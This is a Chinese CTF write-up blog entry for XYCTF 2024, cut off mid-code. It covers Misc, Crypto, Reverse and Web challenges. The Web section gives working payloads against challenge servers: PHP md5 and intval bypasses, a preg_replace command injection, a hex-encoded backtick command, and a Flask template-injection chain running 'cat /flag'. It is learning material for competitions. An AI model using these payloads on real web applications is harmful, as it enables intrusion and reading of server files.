class="hljs-comment">#B@by_5yth0n&amp;z3</span><br><span class="hljs-comment">#Dozerctf&#123;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="我是尊者"><a href="#我是尊者" class="headerlink" title="我是尊者"></a>我是尊者</h2><p>看到wp挺离谱，这么简单</p><p><img src="/../../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" alt="尊者"></p><p>Dozerctf{31de43b1a1fb565dabfa9ad8320f11de}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTFwp及个人复盘</title>
    <link href="/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<hr><p>前言:写一写做出来的题目，和对web不会题目的复盘。是菜狗写的差轻喷。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>没难度吧，题目还没看到就被队友解决了。扫一下码就行了。</p><h2 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h2><p>下载，发现图片和一段类似flag的文字。对应xyctf，想到应该是古典密码埃特巴什码，找个网站一把梭就行。</p><p><img src="/../images/xyctf/%E7%86%8A%E5%8D%9A%E5%A3%AB.png" alt="熊博士"></p><h2 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h2><p>最外层是队友打开的，用的是360的解压，不明白原理，我也打不开。</p><p>打开之后里面的用软件跑一下密码是20240401(开赛日)，压缩包名字是watermark。</p><p>猜测应该是盲水印。</p><p><img src="/../images/xyctf/%E9%9A%90%E5%86%99.BMP" alt="隐写"></p><p>在网上锐化一下还是能看出来的。</p><p>XYCTF{159-WSX-IJN-852}</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>看一下是一个图片.<img src="/../images/xyctf/game.jpg" alt="game"></p><p>一脸懵，一开始以为是什么特殊加密，用Google搜图发现是一个游戏。得到答案。</p><p><img src="/../images/xyctf/game1.png" alt="game1"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h2><p>一开始以为就是搜题目解答我还特地都写了，结果写到100还是不给(真傻啊)。直接看源码，搜索alert,没出，那就score，搜到关键。<img src="/../images/xyctf/zzl1.png" alt="zzl1"></p><p>那就很简单了，打个断点然后score&#x3D;101就行，注意flag是动态的。<img src="/../images/xyctf/zzl2.png" alt="zzl2"></p><h2 id="zip神之套"><a href="#zip神之套" class="headerlink" title="zip神之套"></a>zip神之套</h2><p>解压，猜不出来看看exe,这里需要用ida打开(什么居然考re,还好入了个门)。ida64打开，<img src="/../images/xyctf/zip.png" alt="zip"></p><p>里面是八位，继续盲猜开赛日，20240401，套在里面果然打开了。</p><p>继续打开，能直接打开里面的一个，估计flag是在另外一个zip里面，估计是明文攻击直接用ARPCH明文攻击，这样就能打开了（太懒了不放图了</p><h2 id="真-签到"><a href="#真-签到" class="headerlink" title="真&gt;签到"></a>真&gt;签到</h2><p>用软件跑一下密码654321.打开发现啥也没有，用010打开zip,发现开头有flag。</p><h2 id="EZ-Base1024-2"><a href="#EZ-Base1024-2" class="headerlink" title="EZ_Base1024*2"></a>EZ_Base1024*2</h2><p>下载文件用软件跑一下出答案，用base2048<img src="/../images/xyctf/base2048.png" alt="base2048"></p><h2 id="Osint1"><a href="#Osint1" class="headerlink" title="Osint1"></a>Osint1</h2><p>这是社工题，还挺好玩的，先用百度识图看一下。找到这篇文章。<a href="https://club.m.autohome.com.cn/bbs/threadowner/0f96f216d67eb3dc/97798149-1.html">链接</a>，确定了是在江苏省南通市，搜一下旁边是什么海，是黄海，那就差一条路了。然后我自己跑到google上面看看有没有实景的，再结合图片发现应该是在那个园区附近，还有大风车。(这里用的腾讯地图发现的，其他的都看不清<img src="/../images/xyctf/osint1.png" alt="osint1"></p><p>看着像估计就是这里了，把可能的结果都试一下，发现是滨海东路。</p><h2 id="Osint2"><a href="#Osint2" class="headerlink" title="Osint2"></a>Osint2</h2><p>图片给的是高铁站的图片给的提示是已经玩结束要回去了，在12306搜索一下车次每天只有一班g3293，龙门是在河南省，靠近这个高铁站的就只有几个景点，最后试出来是老君山(我还没爬过,悲伤.jpg)</p><h2 id="Ez-osint"><a href="#Ez-osint" class="headerlink" title="Ez_osint"></a>Ez_osint</h2><p>图片下载直接整破防了，试了几种常规的png隐写没找出来，用stegsolve发现了一个水印网址 <a href="https://www.hi2future.com/">链接</a>，一开始找到的是假flag,观察图片上面的时间直接去找原来的那封信，发现留言有flag(别样的社工题)。</p><h2 id="出题有点烦"><a href="#出题有点烦" class="headerlink" title="出题有点烦"></a>出题有点烦</h2><p>下载文件解压，用软件跑一遍是123456，解压，看到前面三个都不能正常看，用010打开，把开头重新编辑，正常可以看了，第一个图片是假的flag。试了一会之后发现用foremost第五个图像可以分离一个压缩包，提出来用软件跑一遍，密码是xyctf，打开里面是正确的flag.</p><h2 id="美妙的歌声"><a href="#美妙的歌声" class="headerlink" title="美妙的歌声"></a>美妙的歌声</h2><p>下载是wav音频，用Audacity打开，打开多视图发现频谱图好像有点东西，微调一会发现是有东西的</p><p><img src="/../images/xyctf/%E9%9F%B3%E9%A2%91.png" alt="音频"></p><p>这大概率不是直接的flag,应该是key,用deepsound打开，解密分离得到flag.txt，里面有flag,</p><p>XYCTF{T0uch_y0ur_he3rt_d55ply!!}</p><h2 id="Rosk-Paper-Scissors"><a href="#Rosk-Paper-Scissors" class="headerlink" title="Rosk,Paper,Scissors!"></a>Rosk,Paper,Scissors!</h2><p>也是受高人指点，可以进行手搓，一个一个试，只有开头的会随机变，脚本多跑几遍就行了。上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">57882</span>)<br>a=[<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recvuntil(<span class="hljs-string">&quot;&quot;</span>)<br>    p.sendline(i)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="以下为复现（彩蛋"><a href="#以下为复现（彩蛋" class="headerlink" title="以下为复现（彩蛋"></a>以下为复现（彩蛋</h2><p>首先第一段应该是一个八进制转字符串</p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B1.png"></p><p>然后第三段应该是二进制转字符串<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B2.png" alt="彩蛋2"></p><p>第二段说不需要扫描器，参考了其他师傅的wp，是下载图片转png图片，<a href="https://convertio.co/zh/">转化</a>，然后用zsteg得到<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B3.png" alt="彩蛋3"></p><p>审视了一下应该是键盘密码，<a href="http://wbic16.xedoloh.com/dvorak.html">键盘密码</a></p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B4.png" alt="彩蛋4"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="happy-to-solve1"><a href="#happy-to-solve1" class="headerlink" title="happy_to_solve1"></a>happy_to_solve1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><br><span class="hljs-attribute">n</span> =  <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> =  <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">t</span> = <span class="hljs-number">1</span><br><span class="hljs-comment"># 因为q是p的取反后取比其值大的最近的一个素数，所以p + q = 2**512 - 1 + t</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">300</span>):<br>    <span class="hljs-attribute">phi</span> = n - (<span class="hljs-number">2</span>**<span class="hljs-number">512</span> - <span class="hljs-number">1</span> + t) + <span class="hljs-number">1</span><br>    <span class="hljs-attribute">d</span> = gmpy2.invert(e, phi)<br>    <span class="hljs-attribute">m</span> = pow(c, d, n)<br>    <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>    <span class="hljs-attribute">t</span> += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>这部分就是闹着玩随便写写，我不会re就看看题目。所有也懒得放图了。</p><h2 id="聪明的信使"><a href="#聪明的信使" class="headerlink" title="聪明的信使"></a>聪明的信使</h2><p>这个用ida打开，然后空格一下就能看到明显类似flag的一段内容。</p><p>我记得好像是栅栏密码，网上一把梭就行了，没什么难度。</p><h2 id="你是真的大学生吗？"><a href="#你是真的大学生吗？" class="headerlink" title="你是真的大学生吗？"></a>你是真的大学生吗？</h2><p>这题有一丢丢借鉴别人，但是问题不大。同样也是用ida打开就行，找到关键内容就行，也是懒不想看了，（我又不是re手，直接上代码和答案。<img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F.png" alt="大学生"></p><p><img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F1.png" alt="大学生1">差不多吧，嘿嘿。</p><h2 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h2><p>这题其实我感觉挺简单的，具体操作不会，下载一个安卓模拟器，然后用jeb调debugger就行，就能出答案了，but 我不会，sorry啦。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>web真是心碎啊，发现自己不会的还是太多太多了，会把所有没写出来的也顺带复盘一下。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>diserach扫一下有flag.php和robots.txt,里面有账户和密码。</p><p>跟着要求在bp里面改就行了，考察一下头，wp如下。</p><p>User-Agent: XYCTF</p><p>client-Ip:127.0.0.1</p><p>via:ymzx.qq.com</p><p>Referer:yuanshen.com</p><p>Cookie:XYCTF</p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;next.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$XYCTF</span> = <span class="hljs-string">&quot;Warm up&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$md5</span>) &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ezez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> == <span class="hljs-variable">$XYCTF</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$level2</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;学这么久,传参不会传?&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>第一步要传入两个值不等但是md5弱比教相等。尝试传入数组或者用字符串弱比教。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">val1</span>=QNKCDZO&amp;val2=s878926199a<br></code></pre></td></tr></table></figure><p>第二步传入值的md5的值等于本身。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">md5</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>e215962017<br></code></pre></td></tr></table></figure><p>第三步可以利用变量覆盖，把原先的覆盖掉，如下图</p><p><img src="/../images/xyctf/warmup.png" alt="warm up"></p><p>，之后进第二个页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;操作你O.o&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);  <span class="hljs-comment">// 我可不会像别人一样设置10来个level</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有点汗流浃背&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>简要讲一下intval,这个函数会强制把传入的内容转换为数字，但是如果传入的内容是数组就可以进行绕过。</p><p>先尝试post一个a[]&#x3D;1，会显示出操作你0.o</p><p>再审计一下下面的内容,问问万能的chatgpt这是个啥</p><p>$_GET[‘a’] 作为正则表达式模式，$_GET[‘b’] 作为替换的文本或模式，$_GET[‘c’] 作为输入的字符串或数组。具体来说，这段代码是根据从 URL 中获取的参数来执行正则表达式的搜索和替换操作。</p><p>尝试正则几个字母，然后b输入system(‘cat &#x2F;flag’),c再输入几个前面正则的内容就行</p><p>post传入上面的内容对应，上图片。</p><p><img src="/../images/xyctf/warm1.png" alt="warm1"></p><h2 id="ezMD5"><a href="#ezMD5" class="headerlink" title="ezMD5"></a>ezMD5</h2><p>上传两个图片Md5值相同即可，csdn上面有,可以自己搜，最后能出flag.</p><h2 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h2><p>偷偷扫了一下，问题不大吧，&#x2F;flag就能出了<img src="/../images/xyctf/make.png" alt="make"></p><h2 id="ez-make"><a href="#ez-make" class="headerlink" title="ez?make"></a>ez?make</h2><p>本题可以通过两次十六进制绕过，从而得到flag</p><p>先第一次转</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag636174202f666c6167<br></code></pre></td></tr></table></figure><p>再转第二次</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">636174202f666c6167</span><span class="hljs-number">363336313734323032663636366336313637</span><br></code></pre></td></tr></table></figure><p>这里提个知识点</p><p>xxd -r 是将十六进制转换回去，-p是以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。</p><p>所有应该为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">`echo <span class="hljs-string">&quot;363336313734323032663636366336313637&quot;</span>|<span class="hljs-type">xxd</span> -r -p|<span class="hljs-type">xxd</span> -r -p`<br></code></pre></td></tr></table></figure><p>&#96;&#96;是执行语句，执行里面的内容</p><p>xxd -r -p用来转化保持。</p><p><img src="/../images/xyctf/ez%EF%BC%9Fmake.png" alt="ez？make"></p><h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><p>首先猜测用户名是admin,给了字典爆破一下，密码是asdqwe</p><p>进去输入常规的sql和ssit和命令执行都不行</p><p>尝试输入汉字有括号，那我估计就是从这里入手，构造一个flask的注入</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">哈%<span class="hljs-keyword">print</span>(()|attr(request.<span class="hljs-keyword">args</span>.a))|attr(request.<span class="hljs-keyword">args</span>.base)|attr(request.<span class="hljs-keyword">args</span>.sub)()|attr(request.<span class="hljs-keyword">args</span>.getit)(132)|attr(request.<span class="hljs-keyword">args</span>.ini)|attr(request.<span class="hljs-keyword">args</span>.<span class="hljs-keyword">glo</span>)|attr(request.<span class="hljs-keyword">args</span>.getit)(request.<span class="hljs-keyword">args</span>.p)(request.<span class="hljs-keyword">args</span>.cmd)|attr(request.<span class="hljs-keyword">args</span>.r)()%&amp;a=__class__&amp;base=__base__&amp;sub=__subclasses__&amp;getit=__getitem__&amp;cmd=<span class="hljs-keyword">cat</span> /flag&amp;ini=__init__&amp;<span class="hljs-keyword">glo</span>=__globals__&amp;p=popen&amp;r=<span class="hljs-keyword">read</span><br></code></pre></td></tr></table></figure><p>可以得到flag</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$white_list</span> = [<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>]; <br>    <span class="hljs-variable">$cmd_char</span> = <span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$cmd_char</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$char</span>, <span class="hljs-variable">$white_list</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;really ez?&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br></code></pre></td></tr></table></figure><p>本体只能用白名单上的进行绕过，有\有数字估计是八进制，空格用$&lt;进行绕过。</p><p>累了，上payload吧，利用了简要的拼接。</p><p><img src="/../images/xyctf/rce.png" alt="rce"></p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>对于反序列化不好的我一点也不ez,先看源码分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 